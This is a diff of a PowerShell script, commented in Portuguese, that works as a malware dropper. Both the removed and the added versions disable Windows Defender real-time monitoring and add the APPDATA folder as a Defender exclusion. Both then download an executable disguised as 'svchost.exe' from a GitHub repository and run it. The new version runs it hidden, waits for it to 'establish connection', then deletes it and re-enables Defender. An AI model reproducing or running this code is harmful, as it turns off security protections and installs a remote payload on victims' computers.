@@ -1,12 +1,99 @@
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-Set-MpPreference -DisableRealtimeMonitoring $true
-# Adicionar uma exclusÃ£o de caminho no Windows Defender
-Add-MpPreference -ExclusionPath "$env:appdata"
-# Criar o diretÃ³rio de trabalho
-mkdir "$env:appdata\dump"
-Set-Location "$env:appdata\dump"
-# Baixar e executar sv.exe
-Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe" -OutFile "$env:appdata\dump\svchost.exe"
-./sv.exe
+# Verificar se o script está rodando como administrador
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Error "Este script requer privilégios administrativos. Execute-o como administrador."
+    exit 1
+}
+
+# Desativar monitoramento em tempo real do Windows Defender
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+    Write-Host "Monitoramento em tempo real desativado."
+} catch {
+    Write-Error "Erro ao desativar o monitoramento em tempo real: $_"
+    exit 1
+}
+
+# Adicionar exclusão de caminho no Windows Defender
+try {
+    Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction Stop
+    Write-Host "Caminho $env:APPDATA adicionado às exclusões do Windows Defender."
+} catch {
+    Write-Error "Erro ao adicionar exclusão de caminho: $_"
+    exit 1
+}
+
+# Criar diretório de trabalho
+$workDir = "$env:APPDATA\dump"
+try {
+    if (-not (Test-Path $workDir)) {
+        New-Item -Path $workDir -ItemType Directory -ErrorAction Stop | Out-Null
+        Write-Host "Diretório $workDir criado."
+    } else {
+        Write-Host "Diretório $workDir já existe."
+    }
+    Set-Location $workDir
+} catch {
+    Write-Error "Erro ao criar ou acessar o diretório $workDir: $_"
+    exit 1
+}
+
+# Baixar o arquivo
+$fileUrl = "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe"
+$filePath = "$workDir\svchost.exe"
+try {
+    Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -ErrorAction Stop
+    Write-Host "Arquivo baixado com sucesso em $filePath."
+} catch {
+    Write-Error "Erro ao baixar o arquivo: $_"
+    exit 1
+}
+
+# Executar o arquivo e monitorar
+try {
+    if (Test-Path $filePath) {
+        $process = Start-Process -FilePath $filePath -WindowStyle Hidden -PassThru -ErrorAction Stop
+        Write-Host "Arquivo $filePath executado. PID: $($process.Id)"
+        # Aguardar 30 segundos para dar tempo de estabelecer conexão
+        Start-Sleep -Seconds 30
+    } else {
+        Write-Error "Arquivo $filePath não encontrado."
+        exit 1
+    }
+} catch {
+    Write-Error "Erro ao executar o arquivo: $_"
+    exit 1
+}
+
+# Tentar encerrar o processo apenas se ainda estiver ativo
+try {
+    $processName = [System.IO.Path]::GetFileNameWithoutExtension($filePath)
+    $runningProcess = Get-Process -Name $processName -ErrorAction SilentlyContinue
+    if ($runningProcess) {
+        Stop-Process -Name $processName -Force -ErrorAction Stop
+        Write-Host "Processo $processName encerrado."
+    } else {
+        Write-Host "Processo $processName não estava em execução."
+    }
+} catch {
+    Write-Warning "Erro ao tentar encerrar o processo $processName: $_"
+}
+
+# Remover o arquivo baixado
+try {
+    if (Test-Path $filePath) {
+        Remove-Item -Path $filePath -Force -ErrorAction Stop
+        Write-Host "Arquivo $filePath removido."
+    }
+} catch {
+    Write-Error "Erro ao remover o arquivo $filePath: $_"
+    exit 1
+}
+
+# Restaurar monitoramento em tempo real do Windows Defender
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
+    Write-Host "Monitoramento em tempo real restaurado."
+} catch {
+    Write-Warning "Erro ao restaurar o monitoramento em tempo real: $_"
+}
